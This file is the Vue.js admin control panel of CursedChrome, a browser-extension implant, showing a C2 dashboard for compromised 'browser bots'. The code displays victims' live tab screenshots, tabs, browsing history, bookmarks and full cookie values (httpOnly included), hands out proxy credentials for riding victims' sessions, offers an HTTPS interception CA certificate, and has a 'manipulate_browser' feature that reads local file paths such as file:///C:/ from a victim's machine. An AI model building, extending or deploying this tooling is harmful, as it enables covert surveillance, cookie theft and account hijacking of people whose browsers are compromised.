<template>
  <div>
    <!-- Loading bar -->
    <div class="fixed-bottom" v-if="loading">
      <b-progress
        :value="100"
        variant="success"
        striped
        :animated="true"
      ></b-progress>
    </div>
    <!-- Navbar, only displayed when logged in -->
    <div v-if="user.is_authenticated">
      <b-navbar
        toggleable="lg"
        type="dark"
        variant="primary"
        fixed="top"
        sticky
      >
        <b-navbar-brand href="#"
          >CursedChrome Admin Control Panel</b-navbar-brand
        >
        <b-navbar-toggle target="nav-collapse"></b-navbar-toggle>
        <b-collapse id="nav-collapse" is-nav>
          <b-navbar-nav>
            <b-nav-item
              target="_blank"
              href="https://github.com/s045pd/CursedChrome"
            >
              <font-awesome-icon
                :icon="['fab', 'github']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
              Repo
            </b-nav-item>
          </b-navbar-nav>
          <b-navbar-nav class="ml-auto">
            <b-nav-item>
              <font-awesome-icon
                :icon="['fas', 'user']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
              Logged in as: <b>{{ user.username }}</b>
            </b-nav-item>
            <b-nav-item v-on:click="logout">
              Sign Out
              <font-awesome-icon
                :icon="['fas', 'sign-out-alt']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
            </b-nav-item>
          </b-navbar-nav>
        </b-collapse>
      </b-navbar>
      <b-alert
        variant="warning"
        class="text-center"
        show
        v-if="user.password_should_be_changed"
      >
        <p>
          <font-awesome-icon
            :icon="['fas', 'exclamation-triangle']"
            class="icon alt mr-1 ml-1"
          ></font-awesome-icon>
          You are currently using a system-generated password, please update
          your account password.
        </p>
        <b-button variant="primary" v-on:click="show_update_password_modal">
          <font-awesome-icon
            :icon="['fas', 'edit']"
            class="icon alt mr-1 ml-1"
          ></font-awesome-icon>
          Update Password
        </b-button>
      </b-alert>
    </div>
    <div id="main">
      <!-- Login Page -->
      <div v-if="!user.is_authenticated">
        <div class="form-signin" style="max-width: 300px; margin: 0 auto">
          <div class="text-center mb-4">
            <h1 class="h3 mb-3 font-weight-normal">
              CursedChrome
              <br />
              Admin Panel
            </h1>
            <b-alert show>
              <font-awesome-icon
                :icon="['fas', 'info-circle']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
              <i
                >If this is your first time logging in, please use the
                credentials printed to your console when you first set the
                service up.</i
              >
            </b-alert>
          </div>
          <div class="input-group mb-2" style="width: 100%">
            <div class="input-group-prepend">
              <span class="input-group-text" style="min-width: 100px"
                >Username</span
              >
            </div>
            <input
              type="text"
              class="form-control"
              placeholder="admin"
              v-model="user.login.username"
              autofocus
            />
          </div>
          <div class="input-group mb-3" style="width: 100%">
            <div class="input-group-prepend">
              <span class="input-group-text" style="min-width: 100px"
                >Password</span
              >
            </div>
            <input
              type="password"
              class="form-control"
              placeholder="********"
              v-model="user.login.password"
            />
          </div>
          <button class="btn btn-lg btn-primary btn-block" v-on:click="log_in">
            <font-awesome-icon
              :icon="['fas', 'sign-in-alt']"
              class="icon alt mr-1 ml-1"
            ></font-awesome-icon>
            Sign in
          </button>
        </div>
      </div>
      <!-- Admin panel controls -->
      <div v-if="user.is_authenticated">
        <!-- Bots panel -->
        <b-card-group deck>
          <b-card
            border-variant="primary"
            header="CursedChrome Bots"
            header-bg-variant="primary"
            header-text-variant="white"
            align="center"
          >
            <b-card-text>
              <h1>Connected Browser Bot(s)</h1>
              <table class="table table-striped">
                <thead>
                  <tr>
                    <th scope="col">Capture</th>
                    <th scope="col">Name</th>
                    <th scope="col">HTTP Proxy Credentials</th>
                    <th scope="col">Online?</th>
                    <th scope="col">Tabs/History</th>
                    <th scope="col">CurrentTab</th>
                    <th scope="col">Options</th>
                  </tr>
                </thead>
                <tbody>
                  <tr
                    v-for="bot in Object.values(bots_map)"
                    v-bind:key="bot.id"
                  >
                    <td scope="row" style="vertical-align: middle">
                      <b-img
                        :src="bot.current_tab_image"
                        alt="Image"
                        width="160"
                        height="90"
                        fluid
                      ></b-img>
                    </td>
                    <td scope="row" style="vertical-align: middle">
                      {{ bot.name }}[{{ bot.state }}]
                    </td>
                    <td style="vertical-align: middle">
                      <div>
                        <div class="input-group" style="width: 100%">
                          <div class="input-group-prepend">
                            <span
                              class="input-group-text"
                              style="min-width: 100px"
                              >Username</span
                            >
                          </div>
                          <input
                            type="text"
                            class="form-control"
                            placeholder="Please wait..."
                            v-bind:value="bot.proxy_username"
                          />
                          <div class="input-group-append">
                            <span
                              class="input-group-text copy-element"
                              v-bind:data-clipboard-text="bot.proxy_username"
                              v-on:click="copy_toast"
                            >
                              <font-awesome-icon
                                :icon="['fas', 'clipboard']"
                                class="icon alt mr-1 ml-1"
                            /></span>
                          </div>
                        </div>
                        <div class="input-group" style="width: 100%">
                          <div class="input-group-prepend">
                            <span
                              class="input-group-text"
                              style="min-width: 100px"
                              >Password</span
                            >
                          </div>
                          <input
                            type="text"
                            class="form-control"
                            placeholder="Please wait..."
                            v-bind:value="bot.proxy_password"
                          />
                          <div
                            class="input-group-append copy-element"
                            v-bind:data-clipboard-text="bot.proxy_password"
                            v-on:click="copy_toast"
                          >
                            <span class="input-group-text">
                              <font-awesome-icon
                                :icon="['fas', 'clipboard']"
                                class="icon alt mr-1 ml-1"
                            /></span>
                          </div>
                        </div>
                      </div>
                    </td>
                    <td
                      class="table-success online-col"
                      style="vertical-align: middle"
                      v-if="bot.is_online"
                    >
                      <span class="online-symbol">
                        <font-awesome-icon
                          :icon="['fas', 'check-circle']"
                          class="icon alt mr-1 ml-1"
                        />
                      </span>
                    </td>
                    <td
                      class="online-col table-danger p-0"
                      style="vertical-align: middle"
                      v-if="!bot.is_online"
                    >
                      <span class="offline-symbol">
                        <font-awesome-icon
                          :icon="['fas', 'times-circle']"
                          class="icon alt mr-1 ml-1"
                        />
                      </span>
                    </td>
                    <td>{{ bot.tabs.length }} / {{ bot.history.length }}</td>
                    <td>
                      <b-link :href="bot.current_tab.url" target="”_blank”"
                        >{{ bot.current_tab.title }}
                      </b-link>
                    </td>

                    <td style="vertical-align: middle">
                      <b-button-group vertical>
                        <b-button
                          variant="primary"
                          v-on:click="bot_open_options(bot.id)"
                        >
                          <font-awesome-icon
                            :icon="['fas', 'cog']"
                            class="icon alt mr-1 ml-1"
                          />
                          Options
                        </b-button>
                        <b-button
                          variant="danger"
                          v-on:click="delete_bot(bot.id)"
                        >
                          <font-awesome-icon
                            :icon="['fas', 'trash']"
                            class="icon alt mr-1 ml-1"
                          />
                          Delete
                        </b-button>
                      </b-button-group>
                    </td>
                  </tr>
                </tbody>
              </table>
            </b-card-text>
          </b-card>
        </b-card-group>
        <!-- Options panel -->
        <b-card-group deck class="mt-4">
          <b-card
            border-variant="info"
            header="Options"
            header-bg-variant="info"
            header-text-variant="white"
            align="center"
          >
            <b-card-text>
              <b-button variant="info" v-on:click="download_ca">
                <font-awesome-icon
                  :icon="['fas', 'download']"
                  class="icon alt mr-1 ml-1"
                />
                Download HTTPS Proxy CA Certificate
                <i>(Required to Use HTTP Proxy)</i>
              </b-button>
            </b-card-text>
          </b-card>
        </b-card-group>
        <!-- Bot options modal -->
        <div v-if="id_bot_selected">
          <b-modal
            id="bot_options_modal"
            title="Bot Options & Info"
            ok-only
            ok-variant="secondary"
            ok-title="Close"
            size="xl"
            lazy
            scrollable
            @hidden="reset_options_modal"
          >
            <p v-if="bots_map[id_bot_selected].current_tab">
              <a
                :href="bots_map[id_bot_selected].current_tab.url"
                target="”_blank”"
                >{{ bots_map[id_bot_selected].current_tab.title }}
              </a>
            </p>
            <p>
              <b-img-lazy
                center
                thumbnail
                fluid
                :src="bots_map[id_bot_selected].current_tab_image"
                width="800"
                height="450"
              ></b-img-lazy>
            </p>
            <p>
              This bot has a User-Agent of
              <code>{{ bots_map[id_bot_selected].user_agent }}</code> and was
              first seen
              {{
                bots_map[id_bot_selected].createdAt
                  | moment("MMMM Do YYYY, h:mm:ss a")
              }}.
            </p>

            <p>
              Bot UUID is <code>{{ bots_map[id_bot_selected].id }}</code>
            </p>
            <p>
              <b-button-group v-if="id_bot_selected">
                <b-button
                  variant="success"
                  v-if="bots_map[id_bot_selected].tabs"
                  v-on:click="tabs_tab_show = !tabs_tab_show"
                  v-b-toggle.sidebar-tabs
                  >Tabs</b-button
                >
                <b-button
                  variant="warning"
                  v-if="bots_map[id_bot_selected].history"
                  v-on:click="history_tab_show = !history_tab_show"
                  v-b-toggle.sidebar-history
                  >History</b-button
                >
              </b-button-group>

              <!-- TABS -->
            </p>

            <p>
              <b-sidebar
                v-if="tabs_tab_show && bots_map[id_bot_selected].tabs"
                id="sidebar-tabs"
                title="Tabs"
                right
                shadow
                width="500"
              >
                <b-list-group>
                  <b-list-group-item
                    v-for="tab in bots_map[id_bot_selected].tabs"
                    v-bind:key="tab.id"
                  >
                    <b-link :href="tab.url"> {{ tab.title }}</b-link>
                  </b-list-group-item>
                </b-list-group>
              </b-sidebar>

              <!-- HISTORY -->
              <b-sidebar
                v-if="history_tab_show && bots_map[id_bot_selected].history"
                id="sidebar-history"
                title="History"
                left
                shadow
                width="500"
              >
                <input
                  type="input"
                  class="form-control"
                  placeholder="filter"
                  v-model="history_search_word"
                  autofocus
                />
                <b-list-group>
                  <b-list-group-item
                    v-for="history in bots_map[id_bot_selected].history.filter(
                      (item) => {
                        const url = item.url
                          ? item.url.toString().toLowerCase()
                          : '';
                        const title = item.title
                          ? item.title.toString().toLowerCase()
                          : '';
                        const searchWord = history_search_word.toLowerCase();

                        return (
                          url.includes(searchWord) || title.includes(searchWord)
                        );
                      }
                    )"
                    v-bind:key="history.id"
                  >
                    <p>
                      {{
                        history.lastVisitTime | moment("YYYY-MM-DD hh:mm:ss")
                      }}
                    </p>
                    <p>
                      <span>
                        <b-badge href="#" variant="primary">{{
                          history.visitCount
                        }}</b-badge></span
                      >&nbsp;<b-link :href="history.url">{{
                        history.title
                      }}</b-link>
                    </p>
                  </b-list-group-item>
                </b-list-group>
              </b-sidebar>
            </p>
            <p>
              <b-tabs content-class="mt-3" lazy>
                <b-tab title="Cookies">
                  <div style="overflow-x: auto">
                    <b-input-group size="sm">
                      <b-form-input
                        id="cookies-filter-input"
                        v-model="cookies_search_word"
                        type="search"
                        placeholder="Search domain or name or value"
                      ></b-form-input>

                      <b-input-group-append>
                        <b-button
                          :disabled="!cookies_search_word"
                          @click="cookies_search_word = ''"
                          >Clear</b-button
                        >
                      </b-input-group-append>
                    </b-input-group>

                    <b-table
                      id="cookies_table"
                      :items="bots_map[id_bot_selected].cookies"
                      :field="cookies_fields"
                      :current-page="cookies_page"
                      :per-page="cookies_page_size"
                      :filter="cookies_search_word"
                      :filter-included-fields="filterOn"
                      small
                      hover
                      :tbody-tr-class="cookies_row_class"
                      @filtered="on_cookies_filtered"
                    ></b-table>
                  </div>
                  <b-pagination
                    striped
                    hover
                    fixed
                    responsive
                    stacked
                    v-model="cookies_page"
                    :total-rows="bot_length_map[id_bot_selected].cookies"
                    :per-page="cookies_page_size"
                    aria-controls="cookies_table"
                  ></b-pagination>
                </b-tab>
                <b-tab title="BookMarks">
                  <b-tree-view
                    :data="bots_map[id_bot_selected].bookmarks"
                    nodeLabelProp="title"
                  >
                    <template v-slot="{ node: { title, url } }">
                      <b-link :href="url">{{ title }}</b-link>
                    </template>
                  </b-tree-view>
                </b-tab>
                <b-tab title="Config">
                  <div>
                    <b-input-group prepend="Bot Name" class="mt-3">
                      <b-form-input
                        v-model="selected_bot.name"
                        autofocus
                      ></b-form-input>
                    </b-input-group>

                    <b-input-group prepend="Bot Switch" class="mt-3">
                      <b-form-checkbox
                        v-for="key in Object.keys(selected_bot.switch_config)"
                        v-bind:key="key"
                        v-model="selected_bot.switch_config[key]"
                        >{{ key }}</b-form-checkbox
                      >
                    </b-input-group>

                    <b-button variant="primary" v-on:click="update_bot_config">
                      <font-awesome-icon
                        :icon="['fas', 'edit']"
                        class="icon alt mr-1 ml-1"
                      />
                      Update
                    </b-button>
                  </div>
                </b-tab>
                <b-tab title="Browser">
                  <p>
                    <b-input-group prepend="Path" class="mt-3">
                      <b-form-input v-model="check_path"></b-form-input>
                      <b-input-group-append>
                        <b-button variant="info" v-on:click="manipulate"
                          >Check</b-button
                        >
                      </b-input-group-append>
                    </b-input-group>
                  </p>
                  <p>
                    <iframe
                      ref="browser_page"
                      width="100%"
                      height="600px"
                    ></iframe>
                  </p>
                </b-tab>
              </b-tabs>
            </p>
          </b-modal>
        </div>
        <!-- Update user password modal -->
        <div>
          <b-modal
            id="update_password_modal"
            title="Update Account Password"
            ok-only
            ok-variant="secondary"
            ok-title="Never mind"
          >
            <p>Enter your new password below</p>
            <div class="input-group mb-2">
              <div class="input-group-prepend">
                <span class="input-group-text">New Password</span>
              </div>
              <input
                type="password"
                class="form-control"
                placeholder="******"
                v-model="update_password.new_password"
                autofocus
              />
            </div>
            <div class="input-group mb-2">
              <div class="input-group-prepend">
                <span class="input-group-text">New Password (Again)</span>
              </div>
              <input
                type="password"
                class="form-control"
                placeholder="******"
                v-model="update_password.new_password_again"
                autofocus
              />
            </div>
            <b-alert
              class="text-center"
              show
              variant="danger"
              v-if="!change_passwords_match"
            >
              <font-awesome-icon
                :icon="['fas', 'exclamation-circle']"
                class="icon alt mr-1 ml-1"
              />
              Both passwords do not match, double check your inputs.
            </b-alert>
            <b-button
              variant="primary btn-block"
              v-bind:disabled="!change_passwords_match"
              v-on:click="update_user_password"
            >
              <font-awesome-icon
                :icon="['fas', 'key']"
                class="icon alt mr-1 ml-1"
              />
              Change Password
            </b-button>
          </b-modal>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
export default {
  name: "Main",
  components: {},
  data() {
    window.app = this;
    return {
      update_password: {
        new_password: "",
        new_password_again: "",
      },
      user: {
        is_authenticated: false,
        username: null,
        password_should_be_changed: null,
        login: {
          username: "",
          password: "",
        },
      },
      loading: false,
      bots_map: {},

      bot_length_map: {},

      selected_bot: {},
      id_bot_selected: null,
      history_tab_show: false,

      tabs_tab_show: false,

      history_search_word: "",
      history_page: 1,
      history_page_size: 20,

      cookies_search_word: "",
      cookies_page: 1,
      cookies_page_size: 20,
      cookies_item_length: 0,
      cookies_fields: [
        { key: "domain", label: "domain", sortable: true },
        { key: "name", label: "name", sortable: true },
        {
          key: "hostOnly",
          label: "hostOnly",
          sortable: true,
          formatter: (value) => {
            return value === true ? "✅" : "🚫";
          },
        },
        {
          key: "httpOnly",
          label: "httpOnly",
          sortable: true,
          formatter: (value) => {
            return value === true ? "✅" : "🚫";
          },
        },

        { key: "path", label: "path", sortable: true },
        { key: "sameSite", label: "sameSite", sortable: true },
        {
          key: "secure",
          label: "secure",
          sortable: true,
          formatter: (value) => {
            return value === true ? "✅" : "🚫";
          },
        },
        {
          key: "session",
          label: "session",
          sortable: true,
          formatter: (value) => {
            return value === true ? "✅" : "🚫";
          },
        },
        { key: "storeId", label: "storeId", sortable: true },
        { key: "value", label: "value", sortable: true },
      ],
      check_path: "file:///C:/",
    };
  },
  computed: {
    change_passwords_match() {
      return (
        this.update_password.new_password ===
        this.update_password.new_password_again
      );
    },
  },
  methods: {
    async update_user_password() {
      await api_request("PUT", "/password", {
        new_password: this.update_password.new_password,
      });
      this.user.password_should_be_changed = false;
      this.$nextTick(() => {
        this.$bvModal.hide("update_password_modal");
      });
    },
    show_update_password_modal() {
      this.$nextTick(() => {
        this.$bvModal.show("update_password_modal");
      });
    },
    async update_auth_status() {
      try {
        var auth_result = await api_request("GET", "/me", false);
      } catch (e) {
        return;
      }

      this.user.is_authenticated = true;
      this.user.username = auth_result.username;
      this.user.password_should_be_changed =
        auth_result.password_should_be_changed;
    },
    async log_in() {
      try {
        var login_result = await api_request("POST", "/login", {
          username: this.user.login.username,
          password: this.user.login.password,
        });
      } catch (e) {
        console.error(`Invalid login.`);
        console.error(e);
        this.$toastr.e(e.error);
        return;
      }
      // Clear password field
      this.user.login.password = "";

      this.user.is_authenticated = true;
      this.user.username = login_result.username;
      this.user.password_should_be_changed =
        login_result.password_should_be_changed;
    },
    async update_bot_config() {
      await api_request("PUT", "/bots", {
        bot_id: this.selected_bot.id,
        name: this.selected_bot.name,
        switch_config: this.selected_bot.switch_config,
      });
      this.$toastr.s("Bot renamed successfully.");
      this.refresh_bots();
    },
    async delete_bot(bot_id) {
      await api_request("DELETE", "/bots", {
        bot_id: bot_id,
      });
      this.$toastr.s("Bot deleted successfully.");
      this.refresh_bots();
    },
    async manipulate() {
      const response = await api_request("POST", "/manipulate_browser", {
        bot_id: this.selected_bot.id,
        path: this.check_path,
      });
      console.log(response);
      const iframe = this.$refs.browser_page;
      const iframeDocument =
        iframe.contentDocument || iframe.contentWindow.document;

      iframeDocument.open();
      iframeDocument.write(response.html);
      iframeDocument.close();
    },
    bot_open_options(bot_id) {
      console.log(bot_id);
      this.id_bot_selected = bot_id;
      this.selected_bot = copy(this.bots_map[bot_id]);
      this.$nextTick(() => {
        this.$bvModal.show("bot_options_modal");
      });
    },
    reset_options_modal() {
      this.history_tab_show = false;
      this.tabs_tab_show = false;
      this.selected_bot = {};
      this.id_bot_selected = null;
      this.check_path = "file:///C:/";
    },
    async refresh_bots() {
      const response = await api_request("GET", "/bots", false);
      response.bots.map((bot) => {
        this.bots_map[bot.id] = bot;
        this.bot_length_map[bot.id] = {
          cookies: bot.cookies ? bot.cookies.length : 0,
          history: bot.history ? bot.history.length : 0,
          bookmarks: bot.bookmarks ? bot.bookmarks.length : 0,
          tabs: bot.tabs ? bot.tabs.length : 0,
        };
      });
    },
    download_ca() {
      window.location = `${BASE_API_PATH}/download_ca`;
    },
    copy_toast() {
      this.$toastr.s("Copied to clipboard successfully.");
    },

    async logout() {
      await api_request("GET", "/logout", false);
      this.user.is_authenticated = false;
      this.user.password_should_be_changed = null;
    },
    cookies_row_class(item, type) {
      try {
        if (!item || type !== "row" || !item.expirationDate) {
          return;
        }

        const cookie_expiration_date = new Date(item.expirationDate);
        const current_time = new Date();
        const expiration_warning_time = 1000 * 60 * 60 * 1; // 1 hour

        if (current_time - cookie_expiration_date > expiration_warning_time) {
          return "table-success";
        } else if (current_time - cookie_expiration_date > 0) {
          return "table-warning";
        } else {
          return "table-danger";
        }
      } catch (e) {
        console.log(e);
      }
    },
    on_cookies_filtered(filtered_items) {
      this.cookies_page = 1;
      this.cookies_item_length = filtered_items.length;
    },
  },
  // Run on page load
  mounted: async function () {
    new ClipboardJS(".copy-element"); // eslint-disable-line

    // Update auth status
    await this.update_auth_status();

    if (this.user.is_authenticated) {
      this.refresh_bots();
    }

    setInterval(() => {
      if (this.user.is_authenticated) {
        this.refresh_bots();
      }
    }, 1000 * 2);
  },
};

function copy(input_data) {
  return JSON.parse(JSON.stringify(input_data));
}

const BASE_API_PATH = `${location.origin.toString()}/api/v1`;

async function api_request(method, path, body) {
  var request_options = {
    method: method,
    credentials: "include",
    mode: "cors",
    cache: "no-cache",
    headers: {
      "Content-Type": "application/json",
    },
    redirect: "follow",
  };

  if (body) {
    request_options.body = JSON.stringify(body);
  }

  window.app.loading = true;

  try {
    var response = await fetch(`${BASE_API_PATH}${path}`, request_options);
  } catch (e) {
    window.app.loading = false;
    throw e;
  }
  window.app.loading = false;

  const response_body = await response.json();

  if (!response_body.success) {
    return Promise.reject({
      error: response_body.error,
      code: response_body.code,
    });
  }

  return response_body.result;
}
</script>
<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
.online-col {
  width: 20px;
  text-align: center;
}

.offline-symbol {
  font-size: 30px;
  color: #fc0303;
}

.online-symbol {
  font-size: 30px;
  color: #00c914;
}

#main {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  padding-top: 10vh;
  max-width: 90%;
  width: 95%;
  margin: 0 auto;
  top: 50%;
}

.navbar-dark .navbar-nav .nav-link {
  color: rgba(255, 255, 255, 1);
}
</style>
